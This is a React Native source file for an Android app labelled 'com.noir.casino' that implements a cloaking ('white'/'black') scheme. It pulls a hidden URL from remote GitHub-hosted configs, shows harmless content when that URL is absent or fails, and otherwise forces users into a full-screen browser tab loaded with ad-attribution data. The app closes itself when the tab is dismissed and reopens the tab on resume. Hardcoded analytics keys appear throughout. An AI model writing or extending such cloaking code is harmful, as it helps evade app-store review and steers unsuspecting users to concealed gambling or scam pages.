/**
 * RD_MANAGER_ANDROID_BLACK
 *
 * Android manager (black flow) with analytics and cloak handling.
 *
 * @format
 */

import React, { useState, useEffect, useRef, useCallback } from "react";
import {
  View,
  StyleSheet,
  ActivityIndicator,
  Image,
  Linking,
  AppState,
  type AppStateStatus,
} from "react-native";
import RNExitApp from "react-native-exit-app";
import appsFlyer from "react-native-appsflyer";
import { init, setUserId, track } from "@amplitude/analytics-react-native";
import AsyncStorage from "@react-native-async-storage/async-storage";
import { InAppBrowser } from "react-native-inappbrowser-reborn";
import { SafeAreaView } from "react-native-safe-area-context";
import RootNavigator from "./navigation/RootNavigator.js";

const TRACKING_APP_ID = "app25_android";
const ANDROID_APP_ID = "com.noir.casino";
const APPSFLYER_DEV_KEY = "hWREXZVUHPrfqnwyALbMD6";
const AMPLITUDE_API_KEY = "9ac8d5e5e524f920c0b2b35d256d12b9";

const CONFIG_RD_URL = "https://apps-cmyk.github.io/manager-config-rd/manager-config-rd.json";
const CONFIG_UP_URL = "https://pincode69.github.io/manager-config-up/manager-config-up.json";

const fetchBlackUrl = async (trackingAppId: string): Promise<string> => {
  console.log(`[RD_MANAGER_ANDROID_BLACK] fetchBlackUrl() called for trackingAppId: ${trackingAppId}`);
  try {
    console.log(`[RD_MANAGER_ANDROID_BLACK] Fetching UP config: ${CONFIG_UP_URL}`);
    const upResponse = await fetch(`${CONFIG_UP_URL}?t=${Date.now()}`, {
      headers: { "Cache-Control": "no-cache, no-store, must-revalidate" },
    });
    console.log(`[RD_MANAGER_ANDROID_BLACK] UP config response status: ${upResponse.status}`);
    if (upResponse.ok) {
      const upConfig = await upResponse.json();
      const upUrl = (upConfig as Record<string, string>)[trackingAppId];
      console.log(`[RD_MANAGER_ANDROID_BLACK] UP config result for ${trackingAppId}: ${upUrl || "NOT FOUND"}`);
      if (upUrl) return upUrl;
    }
  } catch (e) {
    console.log(`[RD_MANAGER_ANDROID_BLACK] UP config fetch error:`, e);
  }

  try {
    console.log(`[RD_MANAGER_ANDROID_BLACK] Fetching RD config: ${CONFIG_RD_URL}`);
    const rdResponse = await fetch(`${CONFIG_RD_URL}?t=${Date.now()}`, {
      headers: { "Cache-Control": "no-cache, no-store, must-revalidate" },
    });
    console.log(`[RD_MANAGER_ANDROID_BLACK] RD config response status: ${rdResponse.status}`);
    if (rdResponse.ok) {
      const rdConfig = await rdResponse.json();
      const rdUrl = (rdConfig as Record<string, string>)[trackingAppId];
      console.log(`[RD_MANAGER_ANDROID_BLACK] RD config result for ${trackingAppId}: ${rdUrl || "NOT FOUND"}`);
      if (rdUrl) return rdUrl;
    }
  } catch (e) {
    console.log(`[RD_MANAGER_ANDROID_BLACK] RD config fetch error:`, e);
  }

  console.log(`[RD_MANAGER_ANDROID_BLACK] fetchBlackUrl() — no URL found, returning empty`);
  return "";
};

export default function () {
  const [clUrl, setClUrl] = useState<string | null>(null);
  const [showLoader, setShowLoader] = useState(false);
  const [showWebView, setShowWebView] = useState<boolean | null>(null);
  const [isInitialized, setIsInitialized] = useState(false);
  const [blackUrl, setBlackUrl] = useState<string | null>(null);

  const isFetchedRef = useRef<boolean>(false);
  const isTabOpenRef = useRef<boolean>(false);
  const appStateRef = useRef<AppStateStatus>(AppState.currentState);
  const clUrlRef = useRef<string | null>(null);
  const showWebViewRef = useRef<boolean | null>(null);
  clUrlRef.current = clUrl;
  showWebViewRef.current = showWebView;

  useEffect(() => {
    console.log("[RD_MANAGER_ANDROID_BLACK] === INIT useEffect started ===");
    (async () => {
      const url = await fetchBlackUrl(TRACKING_APP_ID);
      console.log(`[RD_MANAGER_ANDROID_BLACK] fetchBlackUrl result: "${url}"`);

      if (!url) {
        console.log("[RD_MANAGER_ANDROID_BLACK] No blackUrl found → showing WHITE content");
        await AsyncStorage.setItem("@cachedBlackUrl", "");
        await AsyncStorage.setItem("@showWebView", "false");
        setShowWebView(false);
        setIsInitialized(true);
        return;
      }

      console.log(`[RD_MANAGER_ANDROID_BLACK] BlackUrl found: ${url}`);
      setBlackUrl(url);

      const cachedUrl = await AsyncStorage.getItem("@cachedBlackUrl");
      const storedValue = await AsyncStorage.getItem("@showWebView");
      console.log(`[RD_MANAGER_ANDROID_BLACK] Cache check — cachedUrl: "${cachedUrl}", storedValue: "${storedValue}"`);

      if (cachedUrl !== url) {
        console.log("[RD_MANAGER_ANDROID_BLACK] URL changed or first time → resetting cache, showWebView=null, showing loader");
        await AsyncStorage.setItem("@cachedBlackUrl", url);
        await AsyncStorage.removeItem("@showWebView");
        setShowWebView(null);
        setShowLoader(true);
        setIsInitialized(true);
      } else if (storedValue !== null) {
        console.log(`[RD_MANAGER_ANDROID_BLACK] Using cached decision: showWebView=${storedValue}`);
        setShowWebView(storedValue === "true");
        setIsInitialized(true);
      } else {
        console.log("[RD_MANAGER_ANDROID_BLACK] URL cached but no decision yet → showing loader");
        setShowLoader(true);
        setIsInitialized(true);
      }
    })();
  }, []);

  const buildLink = useCallback(
    (appsflyerId: string, attributionData?: any): string => {
      if (!blackUrl) {
        return "";
      }
      if (attributionData) {
        const params: any = {
          devKey: APPSFLYER_DEV_KEY,
          appsflyer_id: appsflyerId,
          af_status: attributionData.af_status,
          campaign: attributionData.campaign,
          campaign_id: attributionData.campaign_id,
          ad_group: attributionData.adgroup,
          ad_group_id: attributionData.adgroup_id,
          media_source: attributionData.media_source,
          af_channel: attributionData.af_channel,
          af_adset: attributionData.af_adset,
          adset: attributionData.adset,
          adset_id: attributionData.adset_id,
          gclid: attributionData.gclid,
        };

        if (
          attributionData.campaign &&
          attributionData.campaign !== "" &&
          attributionData.campaign !== null &&
          attributionData.campaign !== undefined
        ) {
          const campaignParts = attributionData.campaign.split("_");
          if (campaignParts.length > 0) params.sub1 = campaignParts[0];
          if (campaignParts.length > 1) params.sub2 = campaignParts[1];
          if (campaignParts.length > 2) params.sub3 = campaignParts[2];
          if (campaignParts.length > 3) params.sub4 = campaignParts[3];
          if (campaignParts.length > 4) params.sub5 = campaignParts[4];
          if (campaignParts.length > 5) params.sub6 = campaignParts[5];
        }

        const query = Object.entries(params)
          .filter(
            ([_, value]) => value !== undefined && value !== null && value !== ""
          )
          .map(
            ([key, value]) =>
              `${encodeURIComponent(key)}=${encodeURIComponent(String(value))}`
          )
          .join("&");
        return `${blackUrl}?${query}`;
      }
      return (
        `${blackUrl}?` +
        `devKey=${encodeURIComponent(APPSFLYER_DEV_KEY)}` +
        `&app_id=${encodeURIComponent(ANDROID_APP_ID)}` +
        `&appsflyer_id=${encodeURIComponent(appsflyerId)}` +
        `&media_source=organic`
      );
    },
    [blackUrl]
  );

  // onInstallConversionData often does not fire again after the first open — restore clUrl for cached BLACK.
  useEffect(() => {
    if (!isInitialized || !blackUrl || showWebView !== true || clUrl) {
      return;
    }
    let cancelled = false;
    (async () => {
      try {
        const appsflyerId = await new Promise<string>((resolve) => {
          appsFlyer.getAppsFlyerUID((err, uid) =>
            resolve(uid || "uid_not_found")
          );
        });
        if (cancelled) return;
        const url = buildLink(appsflyerId, undefined);
        if (url) {
          setClUrl(url);
        }
      } catch (e) {
        console.log("[RD_MANAGER_ANDROID_BLACK] ensureClUrl error:", e);
      }
    })();
    return () => {
      cancelled = true;
    };
  }, [isInitialized, blackUrl, showWebView, clUrl, buildLink]);

  useEffect(() => {
    if (!blackUrl) return;
    console.log("[RD_MANAGER_ANDROID_BLACK] === ANALYTICS useEffect started ===");

    (async () => {
      console.log("[RD_MANAGER_ANDROID_BLACK] Getting AppsFlyer UID...");
      const appsflyerId = await new Promise<string>((resolve) => {
        appsFlyer.getAppsFlyerUID((err, uid) =>
          resolve(uid || "uid_not_found")
        );
      });
      console.log(`[RD_MANAGER_ANDROID_BLACK] AppsFlyer UID: ${appsflyerId}`);

      console.log("[RD_MANAGER_ANDROID_BLACK] Initializing Amplitude...");
      await init(AMPLITUDE_API_KEY, undefined, {
        disableCookies: true,
      }).promise;
      setUserId(appsflyerId);
      track("app_open", { appId: TRACKING_APP_ID });
      console.log("[RD_MANAGER_ANDROID_BLACK] Amplitude initialized, app_open tracked");

      appsFlyer.onInstallConversionData(async (res) => {
        console.log("[RD_MANAGER_ANDROID_BLACK] onInstallConversionData received:", JSON.stringify(res?.data || "NO DATA"));
        if (res?.data) {
          track("af_attribution", { data: res.data, appId: TRACKING_APP_ID });
        } else {
          track("af_attribution_error", { appId: TRACKING_APP_ID });
        }

        const url = buildLink(appsflyerId, res?.data);
        console.log(`[RD_MANAGER_ANDROID_BLACK] buildLink result (clUrl): ${url}`);
        setClUrl(url);
      });

      console.log("[RD_MANAGER_ANDROID_BLACK] Initializing AppsFlyer SDK...");
      appsFlyer.initSdk(
        {
          devKey: APPSFLYER_DEV_KEY,
          appId: ANDROID_APP_ID,
        },
        async (result) => {
          console.log("[RD_MANAGER_ANDROID_BLACK] AppsFlyer SDK initialized successfully");
          const isFirstOpen = await AsyncStorage.getItem("@is_first_open");
          if (!isFirstOpen) {
            console.log("[RD_MANAGER_ANDROID_BLACK] First open detected");
            appsFlyer.logEvent("first_open", { appId: TRACKING_APP_ID });
            await AsyncStorage.setItem("@is_first_open", "true");
          }
        },
        (error) => {
          console.error("[RD_MANAGER_ANDROID_BLACK] AppsFlyer Init Error:", error);
        }
      );
    })();
  }, [blackUrl, buildLink]);

  const makeDecision = async (
    statusCode: number | undefined | null,
    source: string,
    isNetworkError: boolean = false
  ) => {
    console.log(`[RD_MANAGER_ANDROID_BLACK] makeDecision() — source: ${source}, statusCode: ${statusCode}, isNetworkError: ${isNetworkError}`);
    if (statusCode === 404 || isNetworkError) {
      console.log("[RD_MANAGER_ANDROID_BLACK] Decision: → WHITE (404 or network error)");
      await AsyncStorage.setItem("@showWebView", "false");
      setShowWebView(false);
      setShowLoader(false);
    } else {
      console.log("[RD_MANAGER_ANDROID_BLACK] Decision: → BLACK (opening Chrome Tab)");
      await AsyncStorage.setItem("@showWebView", "true");
      setShowWebView(true);
      setShowLoader(false);
    }
  };

  const openChromeTab = useCallback(async (url: string) => {
    if (isTabOpenRef.current) {
      console.log("[RD_MANAGER_ANDROID_BLACK] openChromeTab() — tab already open, skipping");
      return;
    }
    console.log(`[RD_MANAGER_ANDROID_BLACK] openChromeTab() — opening Chrome Tab with URL: ${url}`);
    isTabOpenRef.current = true;
    try {
      const isAvailable = await InAppBrowser.isAvailable();
      console.log(`[RD_MANAGER_ANDROID_BLACK] InAppBrowser.isAvailable(): ${isAvailable}`);
      if (isAvailable) {
        console.log("[RD_MANAGER_ANDROID_BLACK] Opening Chrome Custom Tab...");
        try {
          await InAppBrowser.open(url, {
            toolbarColor: "#000000",
            secondaryToolbarColor: "#000000",
            navigationBarColor: "#000000",
            showTitle: false,
            enableDefaultShare: false,
            enableUrlBarHiding: true,
            forceCloseOnRedirection: false,
          });
        } finally {
          isTabOpenRef.current = false;
        }
        // User closed the tab (X, back, or ˅ force-close) — kill the process
        console.log("[RD_MANAGER_ANDROID_BLACK] Chrome Tab closed — killing process");
        RNExitApp.exitApp();
      } else {
        console.log("[RD_MANAGER_ANDROID_BLACK] InAppBrowser not available — fallback to Linking.openURL");
        isTabOpenRef.current = false;
        Linking.openURL(url);
      }
    } catch (error) {
      console.error("[RD_MANAGER_ANDROID_BLACK] Chrome Tab Error:", error);
      isTabOpenRef.current = false;
    }
  }, []);

  useEffect(() => {
    const sub = AppState.addEventListener("change", (next: AppStateStatus) => {
      const prev = appStateRef.current;
      appStateRef.current = next;

      if (next === "active") {
        // If Chrome Tab is still open but our app became active — the tab was
        // minimized via the ˅ button.  Force-close it so InAppBrowser.open()
        // resolves and our killProcess() flow runs.
        if (isTabOpenRef.current) {
          console.log("[RD_MANAGER_ANDROID_BLACK] Chrome Tab minimized detected — force closing");
          try {
            InAppBrowser.close();
          } catch (e) {
            console.log("[RD_MANAGER_ANDROID_BLACK] InAppBrowser.close() error:", e);
          }
          return;
        }

        // Normal reopen: user returned from background
        if (
          (prev === "background" || prev === "inactive") &&
          clUrlRef.current &&
          showWebViewRef.current === true
        ) {
          void openChromeTab(clUrlRef.current);
        }
      }
    });
    return () => sub.remove();
  }, [openChromeTab]);

  useEffect(() => {
    console.log(`[RD_MANAGER_ANDROID_BLACK] === CHROME TAB useEffect — clUrl: ${clUrl ? "SET" : "null"}, showWebView: ${showWebView} ===`);
    if (!clUrl || showWebView === false) {
      console.log(`[RD_MANAGER_ANDROID_BLACK] Skipping — clUrl: ${!clUrl ? "missing" : "ok"}, showWebView: ${showWebView}`);
      return;
    }

    if (showWebView === true) {
      console.log("[RD_MANAGER_ANDROID_BLACK] Cached decision is BLACK → opening Chrome Tab directly");
      openChromeTab(clUrl);
      return;
    }

    // showWebView === null — need to validate before opening
    if (isFetchedRef.current) {
      console.log("[RD_MANAGER_ANDROID_BLACK] Already fetched, skipping validation");
      return;
    }

    console.log(`[RD_MANAGER_ANDROID_BLACK] Validating URL with HEAD request: ${clUrl}`);
    (async () => {
      try {
        const response = await fetch(clUrl, {
          method: "HEAD",
          headers: { "Cache-Control": "no-cache, no-store, must-revalidate" },
        });
        console.log(`[RD_MANAGER_ANDROID_BLACK] HEAD validation response: ${response.status} ${response.statusText}`);
        if (!isFetchedRef.current) {
          isFetchedRef.current = true;
          await makeDecision(response.status, "fetchValidation");
        }
      } catch (error) {
        console.log(`[RD_MANAGER_ANDROID_BLACK] HEAD validation network error:`, error);
        if (!isFetchedRef.current) {
          isFetchedRef.current = true;
          await makeDecision(undefined, "fetchValidation", true);
        }
      }
    })();
  }, [clUrl, showWebView, openChromeTab]);

  console.log(`[RD_MANAGER_ANDROID_BLACK] RENDER — isInitialized: ${isInitialized}, showWebView: ${showWebView}, showLoader: ${showLoader}, clUrl: ${clUrl ? "SET" : "null"}`);

  return (
    <View style={styles.mainContainer}>
      {isInitialized && showWebView === false && (
        <View style={[styles.layerContainer, styles.layerContent]}>
          <RootNavigator />
        </View>
      )}

      {showLoader && <LoaderOverlay />}
    </View>
  );
}

const LoaderOverlay: React.FC = () => {
  return (
    <View style={[styles.layerContainer, styles.layerLoader]}>
      <SafeAreaView style={styles.loader}>
        <View style={styles.loaderIconWrapper}>
          <Image
            source={{ uri: "ic_launcher" }}
            style={styles.loaderIconFg}
          />
        </View>
        <ActivityIndicator size="large" color="red" />
      </SafeAreaView>
    </View>
  );
};

const styles = StyleSheet.create({
  loader: {
    flex: 1,
    justifyContent: "center",
    alignItems: "center",
    backgroundColor: "#000000",
  },
  layerContainer: {
    position: "absolute",
    top: 0,
    left: 0,
    right: 0,
    bottom: 0,
    width: "100%",
    height: "100%",
  },
  mainContainer: {
    flex: 1,
    backgroundColor: "#000000",
  },
  layerContent: {
    zIndex: 2,
  },
  layerLoader: {
    zIndex: 10,
    backgroundColor: "#000000",
  },
  loaderIconWrapper: {
    width: 150,
    height: 150,
    borderRadius: 12,
    overflow: "hidden",
    marginBottom: 48,
  },
  loaderIconBg: {
    width: 150,
    height: 150,
    position: "absolute",
    top: 0,
    left: 0,
  },
  loaderIconFg: {
    width: 225,
    height: 225,
    position: "absolute",
    top: -37,
    left: -37,
  },
});
